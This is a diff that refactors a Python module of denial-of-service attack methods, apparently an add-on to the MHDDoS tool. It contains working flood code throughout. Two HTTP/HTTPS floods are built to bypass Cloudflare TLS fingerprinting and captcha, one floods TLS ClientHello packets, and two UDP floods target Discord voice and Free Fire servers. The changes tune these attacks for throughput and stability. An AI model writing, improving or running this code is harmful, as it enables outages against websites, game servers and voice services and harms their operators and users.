@@ -1,21 +1,16 @@
 # custom_methods.py
-"""
-Custom attack methods ที่ไม่ใช่ MHDDoS:
-- HTTPS-BYPASS : curl_cffi impersonate → bypass CF TLS fingerprint
-- HTTPS        : massive RPS HTTP/2 flood
-- DDOS-BROWSER : browser emulation → bypass UAM / captcha
-- TLS          : TLS ClientHello flood (handshake exhaustion)
-- VC-DISCORD   : UDP voice flood
-- FREEFIRE     : UDP small-packet flood
-"""
 import asyncio
 import os
 import random
 import socket
 import ssl
-import time
 import threading
-from typing import Callable, Optional
+import time
+
+try:
+    import aiohttp
+except ImportError:
+    aiohttp = None
 
 try:
     from curl_cffi.requests import AsyncSession
@@ -24,27 +19,20 @@ except ImportError:
     HAS_CURL_CFFI = False
 
 
-# ═══════════════════════════════════════════
-# Base
-# ═══════════════════════════════════════════
 class CustomAttack:
-    def __init__(self, target: str, port: int, duration: int,
-                 threads: int, stats: dict, on_stop=None):
+    def __init__(self, target, port, duration, threads, stats):
         self.target = target
         self.port = port
         self.duration = duration
         self.threads = threads
         self.stats = stats
         self.stop_at = time.time() + duration
-        self.on_stop = on_stop
-        self._done = asyncio.Event()
 
     async def run(self):
         raise NotImplementedError
 
     def stop(self):
         self.stop_at = 0
-        self._done.set()
 
 
 # ═══════════════════════════════════════════
@@ -54,9 +42,8 @@ class HTTPSBypass(CustomAttack):
     async def _worker(self, session, url):
         while time.time() < self.stop_at:
             try:
-                r = await session.get(
-                    url, timeout=8,
-                    allow_redirects=False,
+                await session.get(
+                    url, timeout=8, allow_redirects=False,
                     headers={
                         "Accept": "*/*",
                         "Accept-Language": "en-US,en;q=0.9",
@@ -74,52 +61,52 @@ class HTTPSBypass(CustomAttack):
             return
         url = self.target if self.target.startswith("http") \
               else f"https://{self.target}:{self.port}"
-        urls = [url]
         async with AsyncSession() as session:
-            tasks = []
-            for i in range(self.threads):
-                u = urls[i % len(urls)]
-                tasks.append(asyncio.create_task(self._worker(session, u)))
+            tasks = [asyncio.create_task(self._worker(session, url))
+                     for _ in range(self.threads)]
             await asyncio.gather(*tasks, return_exceptions=True)
 
 
 # ═══════════════════════════════════════════
-# HTTPS — massive RPS HTTP/2
+# HTTPS — massive RPS (fix H1: session reuse)
 # ═══════════════════════════════════════════
 class HTTPSMass(CustomAttack):
-    async def _worker(self, url):
-        import aiohttp
+    async def _worker(self, session, url):
         while time.time() < self.stop_at:
-            try:
-                conn = aiohttp.TCPConnector(ssl=False, force_close=True)
-                async with aiohttp.ClientSession(connector=conn) as s:
-                    for _ in range(20):
-                        if time.time() >= self.stop_at: break
-                        try:
-                            async with s.get(url, timeout=aiohttp.ClientTimeout(total=3),
-                                             allow_redirects=False,
-                                             headers={"User-Agent":
-                                             "Mozilla/5.0 Chrome/124"}) as r:
-                                await r.read()
-                                self.stats["hits"] += 1
-                        except Exception:
-                            self.stats["errors"] += 1
-            except Exception:
-                pass
+            for _ in range(20):
+                if time.time() >= self.stop_at:
+                    break
+                try:
+                    async with session.get(
+                        url,
+                        timeout=aiohttp.ClientTimeout(total=3),
+                        allow_redirects=False,
+                        headers={"User-Agent": "Mozilla/5.0 Chrome/124"},
+                    ) as r:
+                        await r.read()
+                        self.stats["hits"] += 1
+                except Exception:
+                    self.stats["errors"] += 1
 
     async def run(self):
+        if aiohttp is None:
+            self.stats["error"] = "aiohttp not installed"
+            return
         url = self.target if self.target.startswith("http") \
               else f"https://{self.target}:{self.port}"
-        tasks = [asyncio.create_task(self._worker(url))
-                 for _ in range(self.threads)]
-        await asyncio.gather(*tasks, return_exceptions=True)
+        conn = aiohttp.TCPConnector(ssl=False, force_close=True,
+                                     limit=0)
+        async with aiohttp.ClientSession(connector=conn) as s:
+            tasks = [asyncio.create_task(self._worker(s, url))
+                     for _ in range(self.threads)]
+            await asyncio.gather(*tasks, return_exceptions=True)
 
 
 # ═══════════════════════════════════════════
 # DDOS-BROWSER — full browser emulation
 # ═══════════════════════════════════════════
 class DdosBrowser(CustomAttack):
-    BROWSER_HEADERS = {
+    HEADERS = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/124.0.0.0 Safari/537.36",
@@ -142,10 +129,9 @@ class DdosBrowser(CustomAttack):
     async def _worker(self, session, url):
         while time.time() < self.stop_at:
             try:
-                r = await session.get(
-                    url, timeout=10,
-                    allow_redirects=True,
-                    headers=self.BROWSER_HEADERS,
+                await session.get(
+                    url, timeout=10, allow_redirects=True,
+                    headers=self.HEADERS,
                 )
                 self.stats["hits"] += 1
             except Exception:
@@ -168,49 +154,52 @@ class DdosBrowser(CustomAttack):
 # TLS — ClientHello flood
 # ═══════════════════════════════════════════
 class TLSAttack(CustomAttack):
-    def _build_clienthello(self) -> bytes:
-        # minimal TLS 1.2 ClientHello
-        return bytes.fromhex(
-            "16030100a00100009c0303"
-        ) + os.urandom(32) + bytes.fromhex(
-            "0000000000000000000000000000000000000000000000000000000000000000"
-            "00200000000000000000000000000000000000000000000000000000000000"
-            "00220000"
-        ) + os.urandom(100)
+    def _build_clienthello(self):
+        return bytes.fromhex("16030100a00100009c0303") \
+               + os.urandom(32) \
+               + bytes.fromhex(
+                   "0000000000000000000000000000000000000000000000000000000000000000"
+                   "00200000000000000000000000000000000000000000000000000000000000"
+                   "00220000"
+               ) \
+               + os.urandom(100)
 
     def _tls_worker(self):
         hello = self._build_clienthello()
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
         while time.time() < self.stop_at:
             try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(2)
-                sock.connect((self.target, self.port))
-                sock.sendall(hello)
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(2)
+                s.connect((self.target, self.port))
+                s.sendall(hello)
                 self.stats["hits"] += 1
-                sock.close()
+                s.close()
             except Exception:
                 self.stats["errors"] += 1
 
     async def run(self):
         threads = [threading.Thread(target=self._tls_worker, daemon=True)
-                   for _ in range(self.threads)]
-        for t in threads: t.start()
+                   for _ in range(min(self.threads, 200))]
+        for t in threads:
+            t.start()
         while time.time() < self.stop_at:
             await asyncio.sleep(0.5)
 
 
 # ═══════════════════════════════════════════
-# VC-DISCORD — UDP voice flood
+# VC-DISCORD (fix M2: cap threads)
 # ═══════════════════════════════════════════
 class VCDiscord(CustomAttack):
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self.threads = min(self.threads, 100)
+
     def _worker(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         try:
             s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
-        except Exception: pass
+        except Exception:
+            pass
         pkt = random._urandom(1500)
         target = (self.target, self.port)
         while time.time() < self.stop_at:
@@ -219,26 +208,32 @@ class VCDiscord(CustomAttack):
                 self.stats["hits"] += 1
             except Exception:
                 self.stats["errors"] += 1
-        try: s.close()
-        except Exception: pass
+        try:
+            s.close()
+        except Exception:
+            pass
 
     async def run(self):
-        threads = [threading.Thread(target=self._worker, daemon=True)
-                   for _ in range(self.threads)]
-        for t in threads: t.start()
+        for _ in range(self.threads):
+            threading.Thread(target=self._worker, daemon=True).start()
         while time.time() < self.stop_at:
             await asyncio.sleep(0.5)
 
 
 # ═══════════════════════════════════════════
-# FREEFIRE — UDP small packet
+# FREEFIRE (fix M2: cap threads)
 # ═══════════════════════════════════════════
 class FreeFire(CustomAttack):
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self.threads = min(self.threads, 100)
+
     def _worker(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         try:
             s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
-        except Exception: pass
+        except Exception:
+            pass
         pkt = random._urandom(512)
         target = (self.target, self.port)
         while time.time() < self.stop_at:
@@ -247,20 +242,18 @@ class FreeFire(CustomAttack):
                 self.stats["hits"] += 1
             except Exception:
                 self.stats["errors"] += 1
-        try: s.close()
-        except Exception: pass
+        try:
+            s.close()
+        except Exception:
+            pass
 
     async def run(self):
-        threads = [threading.Thread(target=self._worker, daemon=True)
-                   for _ in range(self.threads)]
-        for t in threads: t.start()
+        for _ in range(self.threads):
+            threading.Thread(target=self._worker, daemon=True).start()
         while time.time() < self.stop_at:
             await asyncio.sleep(0.5)
 
 
-# ═══════════════════════════════════════════
-# Registry
-# ═══════════════════════════════════════════
 CUSTOM_REGISTRY = {
     "HTTPS-BYPASS": HTTPSBypass,
     "HTTPS":        HTTPSMass,
@@ -271,5 +264,5 @@ CUSTOM_REGISTRY = {
 }
 
 
-def get_custom(name: str):
+def get_custom(name):
     return CUSTOM_REGISTRY.get(name)
